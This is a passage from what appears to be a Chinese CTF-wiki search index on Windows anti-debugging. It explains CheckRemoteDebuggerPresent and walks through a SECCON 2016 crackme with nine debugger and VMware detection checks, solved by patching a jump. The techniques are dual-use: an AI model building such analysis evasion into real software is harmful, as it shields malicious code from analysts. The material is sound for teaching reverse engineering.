\u7684\u8fd4\u56de\u503c\u8fdb\u884c\u4fee\u6539. \u6211\u4eec\u5c06\u5728 NtQueryInformationProcess \u7bc7 \u8fdb\u884c\u4ecb\u7ecd.","title":"CheckRemoteDebuggerPresent"},{"location":"reverse/anti-debug/checkremotedebuggerpresent/#checkremotedebuggerpresent","text":"kernel32 \u7684 CheckRemoteDebuggerPresent() \u51fd\u6570\u7528\u4e8e\u68c0\u6d4b\u6307\u5b9a\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5. Remote \u5728\u5355\u8bcd\u91cc\u662f\u6307\u540c\u4e00\u4e2a\u673a\u5668\u4e2d\u7684\u4e0d\u540c\u8fdb\u7a0b. BOOL WINAPI CheckRemoteDebuggerPresent ( _In_ HANDLE hProcess , _Inout_ PBOOL pbDebuggerPresent ); \u5982\u679c\u8c03\u8bd5\u5668\u5b58\u5728(\u901a\u5e38\u662f\u68c0\u6d4b\u81ea\u5df1\u662f\u5426\u6b63\u5728\u88ab\u8c03\u8bd5), \u8be5\u51fd\u6570\u4f1a\u5c06 pbDebuggerPresent \u6307\u5411\u7684\u503c\u8bbe\u4e3a 0xffffffff .","title":"\u5173\u4e8eCheckRemoteDebuggerPresent"},{"location":"reverse/anti-debug/checkremotedebuggerpresent/#_1","text":"\u53ef\u4ee5\u7528\u4ee5\u4e0b32\u4f4d\u4ee3\u7801\u68c0\u6d4b32\u4f4d\u73af\u5883 push eax push esp push - 1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent pop eax test eax , eax jne being_debugged \u621664\u4f4d\u4ee3\u7801\u68c0\u6d4b64\u4f4d\u73af\u5883 enter 20 h , 0 mov edx , ebp or rcx , - 1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent leave test ebp , ebp jne being_debugged","title":"\u68c0\u6d4b\u4ee3\u7801"},{"location":"reverse/anti-debug/checkremotedebuggerpresent/#_2","text":"\u6bd4\u5982\u6709\u5982\u4e0b\u7684\u4ee3\u7801 int main ( int argc , char * argv []) { BOOL isDebuggerPresent = FALSE ; if ( CheckRemoteDebuggerPresent ( GetCurrentProcess (), & isDebuggerPresent )) { if ( isDebuggerPresent ) { std :: cout << \"Stop debugging program!\" << std :: endl ; exit ( - 1 ); } } return 0 ; } \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 isDebuggerPresent \u7684\u503c\u6216\u4fee\u6539\u8df3\u8f6c\u6761\u4ef6\u6765\u7ed5\u8fc7(\u6ce8\u610f\u4e0d\u662f CheckRemoteDebuggerPresent \u7684izhi, \u5b83\u7684\u8fd4\u56de\u503c\u662f\u7528\u4e8e\u8868\u793a\u51fd\u6570\u662f\u5426\u6b63\u786e\u6267\u884c). \u4f46\u5982\u679c\u8981\u9488\u5bf9 CheckRemoteDebuggerPresent \u8fd9\u4e2aapi\u51fd\u6570\u8fdb\u884c\u4fee\u6539\u7684\u8bdd. \u9996\u5148\u8981\u77e5\u9053 CheckRemoteDebuggerPresent \u5185\u90e8\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528 NtQueryInformationProcess \u6765\u5b8c\u6210\u529f\u80fd\u7684. \u800c\u6211\u4eec\u5c31\u9700\u8981\u5bf9 NtQueryInformationProcess \u7684\u8fd4\u56de\u503c\u8fdb\u884c\u4fee\u6539. \u6211\u4eec\u5c06\u5728 NtQueryInformationProcess \u7bc7 \u8fdb\u884c\u4ecb\u7ecd.","title":"\u5982\u4f55\u7ed5\u8fc7"},{"location":"reverse/anti-debug/example/","text":"\u6211\u4eec\u73b0\u5728\u6765\u5206\u6790\u4e00\u90532016\u5e74SecCon\u7684 anti-debugging \u9898, \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: bin.exe \u8fd9\u662f\u4e00\u4e2a32\u4f4d\u7684PE\u6587\u4ef6, \u662f\u4e00\u4e2a\u63a7\u5236\u53f0\u7a0b\u5e8f, \u6211\u4eec\u76f4\u63a5\u8fd0\u884c, \u4f1a\u8981\u6c42\u8f93\u5165 password . \u5f53\u4f60\u8f93\u5165\u4e00\u4e2a\u9519\u8bef\u7684 password \u65f6\u5219\u4f1a\u63d0\u793a\u4f60 password is wrong . \u6211\u4eec\u7528IDA\u6253\u5f00\u6765\u770b\u4e0b, \u6700\u5feb\u901f\u7684\u65b9\u5f0f\u5c31\u662f\u76f4\u63a5\u67e5\u770b\u5b57\u7b26\u4e32, \u6839\u636e password is wrong \u627e\u5230\u5173\u952e\u4ee3\u7801. IDA\u663e\u793a\u7684\u7ed3\u679c\u5982\u4e0b\u56fe: \u663e\u7136, \u5b57\u7b26\u4e32\u8868\u660e\u7a0b\u5e8f\u4e2d\u53ef\u80fd\u6709\u5404\u79cd\u68c0\u6d4b, \u6bd4\u5982\u68c0\u6d4b\u8fdb\u7a0b\u540d ollydbg.exe , ImmunityDebugger.exe , idaq.exe \u548c Wireshark.exe . \u7136\u540e\u4e5f\u6709\u5176\u4ed6\u7684\u68c0\u6d4b. \u6211\u4eec\u4e5f\u770b\u5230\u4e86\u5b57\u7b26\u4e32 password is wrong \u548c You password is correct \u7684\u5b57\u6837. \u540c\u65f6\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u5f85\u89e3\u5bc6\u7684flag\u7684\u5b57\u7b26\u4e32. \u90a3\u4e48\u6211\u4eec\u5c31\u5148\u6839\u636e password is wrong \u7684\u4ea4\u53c9\u5f15\u7528\u6765\u5230\u5173\u952e\u51fd\u6570\u5904. \u5982\u4e0b\u6240\u793a: \u7a0b\u5e8f\u679c\u7136\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u53cd\u8c03\u8bd5\u6280\u5de7. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { v23 = 0 ; memset ( & v24 , 0 , 0x3Fu ); v22 = 1 ; printf ( \"Input password >\" ); v3 = ( FILE * ) sub_40223D (); fgets ( & v23 , 64 , v3 ); strcpy ( v21 , \"I have a pen.\" ); v22 = strncmp ( & v23 , v21 , 0xDu ); // 1. \u76f4\u63a5\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\u4e0e\u8f93\u5165\u5b57\u7b26\u4e32 if ( ! v22 ) { puts ( \"Your password is correct.\" ); if ( IsDebuggerPresent () == 1 ) // 2. API: IsDebuggerPresent() { puts ( \"But detected debugger!\" ); exit ( 1 ); } if ( sub_401120 () == 0x70 ) // 3. \u68c0\u6d4bPEB\u76840x68\u504f\u79fb\u5904\u662f\u5426\u4e3a0x70. \u68c0\u6d4bNtGlobalFlag() { puts ( \"But detected NtGlobalFlag!\" ); exit ( 1 ); } /* BOOL WINAPI CheckRemoteDebuggerPresent( * _In_ HANDLE hProcess, * _Inout_ PBOOL pbDebuggerPresent * ); */ v4 = GetCurrentProcess (); CheckRemoteDebuggerPresent ( v4 , & pbDebuggerPresent ); if ( pbDebuggerPresent ) // 4. API: CheckRemoteDebuggerPresent() { printf ( \"But detected remotedebug. \\n \" ); exit ( 1 ); } v13 = GetTickCount (); for ( i = 0 ; i == 100 ; ++ i ) Sleep ( 1u ); v16 = 1000 ; if ( GetTickCount () - v13 > 1000 ) // 5. \u68c0\u6d4b\u65f6\u95f4\u5dee { printf ( \"But detected debug. \\n \" ); exit ( 1 ); } lpFileName = \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" ; if ( CreateFileA ( \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" , 0x80000000 , 7u , 0 , 3u , 0x80u , 0 ) != ( HANDLE ) - 1 ) { printf ( \"But detect %s. \\n \" , & lpFileName ); // 6. \u68c0\u6d4bProcessMonitor exit ( 1 ); } v11 = sub_401130 (); // 7. API: CreateToolhelp32Snapshot()\u68c0\u6d4b\u8fdb\u7a0b if ( v11 == 1 ) { printf ( \"But detected Ollydbg. \\n \" ); exit ( 1 ); } if ( v11 == 2 ) { printf ( \"But detected ImmunityDebugger. \\n \" ); exit ( 1 ); } if ( v11 == 3 ) { printf ( \"But detected IDA. \\n \" ); exit ( 1 ); } if ( v11 == 4 ) { printf ( \"But detected WireShark. \\n \" ); exit ( 1 ); } if ( sub_401240 () == 1 ) // 8. \u901a\u8fc7vmware\u7684I/O\u7aef\u53e3\u8fdb\u884c\u68c0\u6d4b { printf ( \"But detected VMware. \\n \" ); exit ( 1 ); } v17 = 1 ; v20 = 1 ; v12 = 0 ; v19 = 1 / 0 ; ms_exc . registration . TryLevel = - 2 ; // 9. SEH printf ( \"But detected Debugged. \\n \" ); exit ( 1 ); } printf ( \"password is wrong. \\n \" ); return 0 ; } \u6211\u5728\u4ee3\u7801\u91cc\u5199\u4e86\u6ce8\u91ca, \u5217\u51fa\u4e86\u5176\u4e2d\u6240\u4f7f\u7528\u76849\u4e2a\u4fdd\u62a4\u6280\u672f\u90e8\u5206. \u6211\u4eec\u6765\u9010\u4e00\u5206\u6790\u4e00\u4e0b\u5427. \u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32 \u00b6 printf ( \"Input password >\" ); v3 = ( FILE * ) sub_40223D (); fgets ( & v23 , 64 , v3 ); strcpy ( v21 , \"I have a pen.\" ); v22 = strncmp ( & v23 , v21 , 0xDu ); // 1. \u76f4\u63a5\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\u4e0e\u8f93\u5165\u5b57\u7b26\u4e32 if ( ! v22 ) { ...... } \u8fd9\u91cc\u5c31\u662f\u8f93\u51fa Input password > . \u7136\u540e\u7528 fgets() \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32, \u5c06 I have a pen. \u590d\u5236\u5230 v21 \u7684\u7f13\u51b2\u533a\u4e2d, \u7136\u540e\u7528 strncmp \u6bd4\u5bf9\u7528\u6237\u8f93\u5165\u4e0e I have a pen. \u7684\u5185\u5bb9, \u5e76\u5c06\u6bd4\u8f83\u7ed3\u679c\u8fd4\u56de\u7ed9 v22 . \u4ee5\u4e0b\u4f1a\u6839\u636e v22 , \u4e5f\u5c31\u662f\u6839\u636e\u8f93\u5165\u7684 password \u662f\u5426\u6b63\u786e, \u800c\u8fdb\u884c\u8df3\u8f6c. IsDebuggerPresent() \u00b6 puts ( \"Your password is correct.\" ); if ( IsDebuggerPresent () == 1 ) // 2. API: IsDebuggerPresent() { puts ( \"But detected debugger!\" ); exit ( 1 ); } \u663e\u7136, \u8f93\u5165\u7684 password \u6b63\u786e, \u5c31\u4f1a\u8f93\u51fa\u63d0\u793a Your password is correct. . ??? \u4e0d\u89c9\u5f97\u5947\u602a\u5417. \u96be\u9053 I have a pen. \u5c31\u662f\u6211\u4eec\u7684flag\u4e86\u5417? \u4e0d\u4e0d\u4e0d\u5f53\u7136\u4e0d\u662f. \u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u9677\u9631, \u65e2\u7136\u4f60\u77e5\u9053\u4e86 I have a pen. \u90a3\u4e48\u5c31\u80af\u5b9a\u6709\u901a\u8fc7\u67d0\u79cd\u9006\u5411\u624b\u6bb5\u5728\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790. \u6240\u4ee5\u63a5\u4e0b\u6765\u7684\u90e8\u5206\u5c31\u5f00\u59cb\u8fdb\u884c\u4e00\u4e9b\u53cd\u8c03\u8bd5\u6216\u5176\u4ed6\u7684\u68c0\u6d4b\u624b\u6bb5(\u5b9e\u9645\u4e2d\u4e5f\u53ef\u4ee5\u51fa\u73b0\u8fd9\u6837\u7684\u9677\u9631). \u4e00\u5f00\u59cb\u7684\u662f IsDebuggerPresent() , \u6839\u636e\u8fd4\u56de\u7ed3\u679c\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5.\u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b IsDebuggerPresent() \u7bc7 NtGlobalFlag \u00b6 \u63a5\u4e0b\u6765\u662f\u68c0\u6d4b NtGlobalFlag \u8fd9\u4e2a\u5b57\u6bb5\u7684\u6807\u5fd7\u4f4d. \u901a\u8fc7\u68c0\u6d4bPEB\u7684\u5b57\u6bb5\u503c\u662f\u5426\u4e3a 0x70 \u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b NtGlobalFlag \u7bc7 if ( sub_401120 () == 0x70 ) // 3. \u68c0\u6d4bPEB\u76840x68\u504f\u79fb\u5904\u662f\u5426\u4e3a0x70. \u68c0\u6d4bNtGlobalFlag() { puts ( \"But detected NtGlobalFlag!\" ); exit ( 1 ); } \u90a3\u6211\u4eec\u6765\u7b80\u5355\u770b\u4e00\u4e0b sub_401120() \u597d\u4e86 int sub_401120 () { return * ( _DWORD * )( __readfsdword ( 48 ) + 0x68 ) & 0x70 ; } 0x68 \u662fPEB\u7684 NtGlobalFlag \u5b57\u6bb5\u5bf9\u5e94\u504f\u79fb\u503c. 0x70 \u662f FLG_HEAP_ENABLE_TAIL_CHECK (0x10) , FLG_HEAP_ENABLE_FREE_CHECK (0x20) \u548c FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u8fd9\u4e09\u4e2a\u6807\u5fd7 CheckRemoteDebuggerPresent \u00b6 /* BOOL WINAPI CheckRemoteDebuggerPresent( * _In_ HANDLE hProcess, * _Inout_ PBOOL pbDebuggerPresent * ); */ v4 = GetCurrentProcess (); CheckRemoteDebuggerPresent ( v4 , & pbDebuggerPresent ); if ( pbDebuggerPresent ) // 4. API: CheckRemoteDebuggerPresent() { printf ( \"But detected remotedebug. \\n \" ); exit ( 1 ); } \u8fd9\u91cc\u6211\u987a\u4fbf\u5728\u6ce8\u91ca\u91cc\u5217\u51fa\u4e86 CheckRemoteDebuggerPresent() \u8fd9\u4e2aAPI\u7684\u51fd\u6570\u539f\u578b. \u5982\u679c\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728, \u4f1a\u5c06 pbDebuggerPresent \u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u96f6\u503c. \u6839\u636e\u5176\u503c\u68c0\u6d4b\u8c03\u8bd5\u5668( CheckRemoteDebuggerPresent() \u7bc7) \u65f6\u95f4\u5dee\u68c0\u6d4b \u00b6 v13 = GetTickCount (); for ( i = 0 ; i == 100 ; ++ i ) // \u7761\u7720 Sleep ( 1u ); v16 = 1000 ; if ( GetTickCount () - v13 > 1000 ) // 5. \u68c0\u6d4b\u65f6\u95f4\u5dee { printf ( \"But detected debug. \\n \" ); exit ( 1 ); } GetTickCount \u4f1a\u8fd4\u56de\u542f\u52a8\u5230\u73b0\u5728\u7684\u6beb\u79d2\u6570, \u5faa\u73af\u91cc\u5149\u662f sleep(1) \u5c31\u8fdb\u884c\u4e86100\u6b21, \u4e5f\u5c31\u662f100\u6beb\u79d2. \u4e24\u6b21\u5f97\u5230\u7684\u65f6\u95f4\u4f5c\u5dee\u5982\u679c\u5927\u4e8e1000\u6beb\u79d2, \u65f6\u5dee\u660e\u663e\u5927\u4e8e\u6240\u8017\u7684\u65f6\u95f4, \u4e5f\u5c31\u95f4\u63a5\u68c0\u6d4b\u5230\u4e86\u8c03\u8bd5. ProcessMonitor \u00b6 lpFileName = \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" ; if ( CreateFileA ( \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" , 0x80000000 , 7u , 0 , 3u , 0x80u , 0 ) != ( HANDLE ) - 1 ) { printf ( \"But detect %s. \\n \" , & lpFileName ); // 6. \u68c0\u6d4bProcessMonitor exit ( 1 ); } \u8fd9\u91cc\u901a\u8fc7\u68c0\u6d4b\u8bbe\u5907\u6587\u4ef6 \\\\\\\\.\\\\Global\\\\ProcmonDebugLogger \u6765\u68c0\u6d4b ProcessMonitor \u68c0\u6d4b\u8fdb\u7a0b\u540d \u00b6 \u8fd9\u91cc\u901a\u8fc7\u6267\u884c sub_401130() \u51fd\u6570\u6765\u68c0\u6d4b\u8fdb\u7a0b, \u5e76\u6839\u636e\u68c0\u6d4b\u5230\u7684\u4e0d\u540c\u8fdb\u7a0b, \u8fd4\u56de\u76f8\u5e94\u7684\u503c. v11 = sub_401130 (); // 7. API: CreateToolhelp32Snapshot()\u68c0\u6d4b\u8fdb\u7a0b if ( v11 == 1 ) { printf ( \"But detected Ollydbg. \\n \" ); exit ( 1 ); } if ( v11 == 2 ) { printf ( \"But detected ImmunityDebugger. \\n \" ); exit ( 1 ); } if ( v11 == 3 ) { printf ( \"But detected IDA. \\n \" ); exit ( 1 ); } if ( v11 == 4 ) { printf ( \"But detected WireShark. \\n \" ); exit ( 1 ); } \u6211\u4eec\u5c31\u6765\u770b\u4e00\u4e0b sub_401130() \u51fd\u6570 signed int sub_401130 () { PROCESSENTRY32 pe ; // [sp+0h] [bp-138h]@1 HANDLE hSnapshot ; // [sp+130h] [bp-8h]@1 int i ; // [sp+134h] [bp-4h]@1 pe . dwSize = 296 ; memset ( & pe . cntUsage , 0 , 0x124u ); hSnapshot = CreateToolhelp32Snapshot ( 2u , 0 ); for ( i = Process32First ( hSnapshot , & pe ); i == 1 ; i = Process32Next ( hSnapshot , & pe ) ) { if ( ! _stricmp ( pe . szExeFile , \"ollydbg.exe\" ) ) return 1 ; if ( ! _stricmp ( pe . szExeFile , \"ImmunityDebugger.exe\" ) ) return 2 ; if ( ! _stricmp ( pe . szExeFile , \"idaq.exe\" ) ) return 3 ; if ( ! _stricmp ( pe . szExeFile , \"Wireshark.exe\" ) ) return 4 ; } return 0 ; } \u8fd9\u91cc\u4f7f\u7528\u4e86API: CreateToolhelp32Snapshot \u6765\u83b7\u53d6\u5f53\u524d\u7684\u8fdb\u7a0b\u4fe1\u606f. \u5e76\u5728for\u5faa\u73af\u91cc\u4f9d\u6b21\u6bd4\u5bf9. \u5982\u679c\u627e\u5230\u6307\u5b9a\u7684\u8fdb\u7a0b\u540d, \u5c31\u76f4\u63a5\u8fd4\u56de\u76f8\u5e94\u7684\u503c. \u7136\u540e\u6839\u636e\u8fd4\u56de\u503c\u8df3\u8f6c\u5230\u4e0d\u540c\u7684\u5206\u652f\u91cc. \u68c0\u6d4bVMware \u00b6 \u68c0\u6d4bVMware\u4e5f\u662f\u68c0\u6d4b\u4e00\u4e9b\u7279\u5f81. \u6839\u636e\u68c0\u6d4b\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad. if ( sub_401240 () == 1 ) // 8. \u901a\u8fc7vmware\u7684I/O\u7aef\u53e3\u8fdb\u884c\u68c0\u6d4b { printf ( \"But detected VMware. \\n \" ); exit ( 1 ); } \u6765\u770b sub_401240() \u51fd\u6570. signed int sub_401240 () { unsigned __int32 v0 ; // eax@1 v0 = __indword ( 0x5658u ); return 1 ; } \u8fd9\u662fVMware\u7684\u4e00\u4e2a\"\u540e\u95e8\"I/O\u7aef\u53e3, 0x5658 = \"VX\" . \u5982\u679c\u7a0b\u5e8f\u5728VMware\u5185\u8fd0\u884c, \u7a0b\u5e8f\u4f7f\u7528 In \u6307\u4ee4\u901a\u8fc7 0x5658 \u7aef\u53e3\u8bfb\u53d6\u6570\u636e\u65f6, EBX \u5bc4\u5b58\u5668\u7684\u503c\u5c31\u4f1a\u53d8\u4e3a 0x564D5868 ( 0x564D5868 == \"VMXh\" ) \u770bIDA\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u5f88\u76f4\u89c2\u5730\u4f53\u73b0\u8fd9\u70b9, \u6211\u4eec\u770b\u6c47\u7f16\u4ee3\u7801\u5c31\u6e05\u695a\u4e86 .text: 0040127 A push edx .text: 0040127 B push ecx .text: 0040127 C push ebx .text: 0040127 D mov eax , 564 D5868h // < ------ .text: 00401282 mov ebx , 0 .text: 00401287 mov ecx , 0 Ah .text: 0040128 C mov edx , 5658 h // < ------ .text: 00401291 in eax , dx .text: 00401292 pop ebx .text: 00401293 pop ecx .text: 00401294 pop edx \u66f4\u591a\u9605\u8bfb: E-cards don?t like virtual environments SEH \u00b6 v17 = 1 ; v20 = 1 ; v12 = 0 ; v19 = 1 / 0 ; // 9. SEH ms_exc . registration . TryLevel = - 2 ; printf ( \"But detected Debugged. \\n \" ); exit ( 1 ); \u63a5\u4e0b\u6765\u8fd9\u4e00\u6bb5, \u5f88\u5947\u602a\u4e0d\u662f\u5417. \u8fd9\u91cc v19 = 1 / 0; \u660e\u663e\u662f\u4e0d\u5408\u5e38\u7406\u7684, \u4f1a\u4ea7\u751f\u4e00\u4e2a\u9664\u96f6\u5f02\u5e38. \u800c\u540e\u9762\u7684 ms_exc.registration.TryLevel = -2; \u8fd9\u662f\u89e3\u9664\u5f02\u5e38, TryLevel=TRYLEVEL_NONE (-2) . \u6765\u770b\u6c47\u7f16\u4ee3\u7801. .text:004015B8 mov [ebp+var_88], 1 .text:004015C2 mov [ebp+var_7C], 1 .text:004015C9 mov [ebp+var_9C], 0 .text:004015D3 mov [ebp+ms_exc.registration.TryLevel], 0 .text:004015DA mov eax, [ebp+var_7C] .text:004015DD cdq .text:004015DE idiv [ebp+var_9C] .text:004015E4 mov [ebp+var_80], eax .text:004015E7 mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh .text:004015EE jmp short loc_40160A \u5728\u8fd9\u91cc\u7684 idiv [ebp+var_9C] \u89e6\u53d1\u5f02\u5e38\u540e\u5c31\u7531\u7a0b\u5e8f\u6ce8\u518c\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570\u63a5\u7ba1, \u800c\u5982\u679c\u6ca1\u6709\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u8bbe\u4e0b\u65ad\u70b9\u7684\u8bdd, \u7a0b\u5e8f\u5c31\u5bb9\u6613\u8dd1\u98de. \u83b7\u53d6flag \u00b6 \u4f46\u6574\u4e2a\u770b\u4e0b\u4e86. \u600e\u4e48\u611f\u89c9\u5173flag\u4e00\u70b9\u4e8b\u90fd\u6ca1\u6709\u4e86\u5462? \u8fd8\u6709\u6ca1\u6709\u8bb0\u8d77\u4e4b\u524d\u5728\u5b57\u7b26\u4e32\u7a97\u53e3\u770b\u5230\u7684\u7591\u4f3c\u662f\u90a3\u4e2a\u5f85\u89e3\u5bc6\u7684flag\u7684\u5b57\u7b26\u4e32? \u5b9e\u9645\u4e0a\u7531\u4e8eIDA\u53cd\u7f16\u8bd1\u7684\u9650\u5236, \u4f7f\u5f97\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u6b63\u786e. \u6bd4\u5982\u5728\u6700\u540e\u4e00\u6bb5\u7684 printf(\"But detected Debugged.\\n\"); \u8fd9\u91cc, \u6211\u4eec\u6765\u770b\u5177\u4f53\u7684\u6c47\u7f16\u4ee3\u7801. .text: 00401627 call sub_4012E0 .text: 0040162 C movzx eax , ax .text: 0040162 F mov [ ebp + var_A8 ], eax .text: 00401635 cmp [ ebp + var_A8 ], 0 // < ------ .text: 0040163 C jz short loc_401652 // < ------ .text: 0040163 E push offset aButDetectedD_2 ; \"But detected Debugged.\\n\" .text : 00401643 call _printf .text: 00401648 add esp , 4 .text: 0040164 B push 1 ; int .text : 0040164 D call _exit \u5b9e\u9645\u4e0a\u8fd9\u4e00\u6bb5\u4ee3\u7801\u5e76\u6ca1\u6709\u88abIDA\u53cd\u7f16\u8bd1\u51fa\u6765. \u800c loc_401652 \u4f4d\u7f6e\u5219\u662f\u4e00\u4e32\u4ee3\u7801, \u4eae\u70b9\u5728\u4e8e\u4f7f\u7528\u4e86\u4e00\u4e2a MessageBoxA \u7684\u51fd\u6570. \u800c\u4e14\u51fd\u6570\u53c2\u6570\u4e4b\u4e00\u5c31\u662f\u6211\u4eec\u7684\u5f85\u89e3\u5bc6flag. \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u8f93\u5165 I have a pen. \u540e, \u5728 if ( !v22 ) \u8df3\u8f6c\u7684\u6c47\u7f16\u4ee3\u7801\u90e8\u5206, \u5c06\u5176\u624b\u52a8\u6539\u4e3a\u8df3\u8f6c\u5230flag\u89e3\u5bc6\u53ca\u5f39\u51fa messagebox \u7684\u90e8\u5206\u8fd0\u884c, \u8ba9\u7a0b\u5e8f\u81ea\u5df1\u5e2e\u5fd9\u89e3\u5bc6\u5e76\u8f93\u51fa, \u5c31\u53ef\u4ee5\u4e86. \u64cd\u4f5c\u5982\u4e0b\u56fe\u6240\u793a: \u8fd9\u91cc\u662f\u8f93\u5165 I have a pen. \u540e\u7684\u8df3\u8f6c\u90e8\u5206, \u56e0\u4e3a\u6b63\u5e38\u8df3\u8f6c\u5230\u7684\u90e8\u5206, \u5168\u662f\u4e00\u4e9b\u68c0\u6d4b\u8c03\u8bd5\u7684\u5185\u5bb9, \u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8df3\u5230\u4ee3\u7801\u89e3\u5bc6\u7684\u90e8\u5206. \u4e5f\u5c31\u662f 00401663 \u7684\u4f4d\u7f6e. \u5728 00401663 \u4ee5\u4e0a\u7684 mov-cmp-jnz \u4e5f\u662f\u4e00\u4e2a\u9a8c\u8bc1\u90e8\u5206, \u5c31\u4e0d\u7ba1\u4e86, \u76f4\u63a5\u8df3\u5230 00401663 \u8fd9\u91cc\u7684 mov ecx, 7 \u8fd9\u91cc\u8fd0\u884c\u89e3\u5bc6\u4ee3\u7801, \u5e76\u987a\u7740\u6267\u884c MessageBoxA() \u5f39\u51fa\u6d88\u606f\u6846, \u62ff\u5230flag","title":"\u53cd\u8c03\u8bd5\u6280\u672f\u4f8b\u9898"},{"location":"reverse/anti-debug/example/#_1","text":"printf ( \"Input password >\" ); v3 = ( FILE * ) sub_40223D (); fgets ( & v23 , 64 , v3 ); strcpy ( v21 , \"I have a pen.\" ); v22 = strncmp ( & v23 , v21 , 0xDu ); // 1. \u76f4\u63a5\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\u4e0e\u8f93\u5165\u5b57\u7b26\u4e32 if ( ! v22 ) { ...... } \u8fd9\u91cc\u5c31\u662f\u8f93\u51fa Input password > . \u7136\u540e\u7528 fgets() \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32, \u5c06 I have a pen. \u590d\u5236\u5230 v21 \u7684\u7f13\u51b2\u533a\u4e2d, \u7136\u540e\u7528 strncmp \u6bd4\u5bf9\u7528\u6237\u8f93\u5165\u4e0e I have a pen. \u7684\u5185\u5bb9, \u5e76\u5c06\u6bd4\u8f83\u7ed3\u679c\u8fd4\u56de\u7ed9 v22 . \u4ee5\u4e0b\u4f1a\u6839\u636e v22 , \u4e5f\u5c31\u662f\u6839\u636e\u8f93\u5165\u7684 password \u662f\u5426\u6b63\u786e, \u800c\u8fdb\u884c\u8df3\u8f6c.","title":"\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32"},{"location":"reverse/anti-debug/example/#isdebuggerpresent","text":"puts ( \"Your password is correct.\" ); if ( IsDebuggerPresent () == 1 ) // 2. API: IsDebuggerPresent() { puts ( \"But detected debugger!\" ); exit ( 1 ); } \u663e\u7136, \u8f93\u5165\u7684 password \u6b63\u786e, \u5c31\u4f1a\u8f93\u51fa\u63d0\u793a Your password is correct. . ??? \u4e0d\u89c9\u5f97\u5947\u602a\u5417. \u96be\u9053 I have a pen. \u5c31\u662f\u6211\u4eec\u7684flag\u4e86\u5417? \u4e0d\u4e0d\u4e0d\u5f53\u7136\u4e0d\u662f. \u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u9677\u9631, \u65e2\u7136\u4f60\u77e5\u9053\u4e86 I have a pen. \u90a3\u4e48\u5c31\u80af\u5b9a\u6709\u901a\u8fc7\u67d0\u79cd\u9006\u5411\u624b\u6bb5\u5728\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790. \u6240\u4ee5\u63a5\u4e0b\u6765\u7684\u90e8\u5206\u5c31\u5f00\u59cb\u8fdb\u884c\u4e00\u4e9b\u53cd\u8c03\u8bd5\u6216\u5176\u4ed6\u7684\u68c0\u6d4b\u624b\u6bb5(\u5b9e\u9645\u4e2d\u4e5f\u53ef\u4ee5\u51fa\u73b0\u8fd9\u6837\u7684\u9677\u9631). \u4e00\u5f00\u59cb\u7684\u662f IsDebuggerPresent() , \u6839\u636e\u8fd4\u56de\u7ed3\u679c\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5.\u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b IsDebuggerPresent() \u7bc7","title":"IsDebuggerPresent()"},{"location":"reverse/anti-debug/example/#ntglobalflag","text":"\u63a5\u4e0b\u6765\u662f\u68c0\u6d4b NtGlobalFlag \u8fd9\u4e2a\u5b57\u6bb5\u7684\u6807\u5fd7\u4f4d. \u901a\u8fc7\u68c0\u6d4bPEB\u7684\u5b57\u6bb5\u503c\u662f\u5426\u4e3a 0x70 \u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b NtGlobalFlag \u7bc7 if ( sub_401120 () == 0x70 ) // 3. \u68c0\u6d4bPEB\u76840x68\u504f\u79fb\u5904\u662f\u5426\u4e3a0x70. \u68c0\u6d4bNtGlobalFlag() { puts ( \"But detected NtGlobalFlag!\" ); exit ( 1 ); } \u90a3\u6211\u4eec\u6765\u7b80\u5355\u770b\u4e00\u4e0b sub_401120() \u597d\u4e86 int sub_401120 () { return * ( _DWORD * )( 